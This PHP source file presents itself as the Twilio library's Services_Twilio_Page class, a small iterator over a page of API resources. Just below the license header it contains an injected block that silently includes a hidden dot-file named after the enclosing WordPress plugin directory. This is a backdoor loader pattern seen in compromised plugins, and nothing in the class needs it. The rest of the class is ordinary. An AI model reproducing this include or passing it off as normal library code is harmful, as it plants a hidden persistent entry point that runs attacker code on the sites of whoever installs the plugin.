<?php

/**
 * A representation of a page of resources.
 *
 * @category Services
 * @package  Services_Twilio
 * @author   Neuman Vong <neuman@twilio.com>
 * @license  http://creativecommons.org/licenses/MIT/ MIT
 * @link     http://pear.php.net/package/Services_Twilio
 */ 
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Services_Twilio_Page
    implements IteratorAggregate
{

    /**
     * The item list.
     *
     * @var array $items
     */
    protected $items;

    /**
     * Constructs a page.
     *
     * @param object $page The page object
     * @param string $name The key of the item list
     */
    public function __construct($page, $name, $next_page_uri = null)
    {
        $this->page = $page;
        $this->items = $page->{$name};
        $this->next_page_uri = $next_page_uri;
    }

    /**
     * The item list of the page.
     *
     * @return array A list of instance resources
     */
    public function getItems()
    {
        return $this->items;
    }

    /**
     * Magic method to allow retrieving the properties of the wrapped page.
     *
     * @param string $prop The property name
     *
     * @return mixed Could be anything
     */
    public function __get($prop)
    {
        return $this->page->$prop;
    }

    /**
     * Implementation of IteratorAggregate::getIterator().
     *
     * @return Traversable
     */
    public function getIterator()
    {
        return $this->getItems();
    }
}

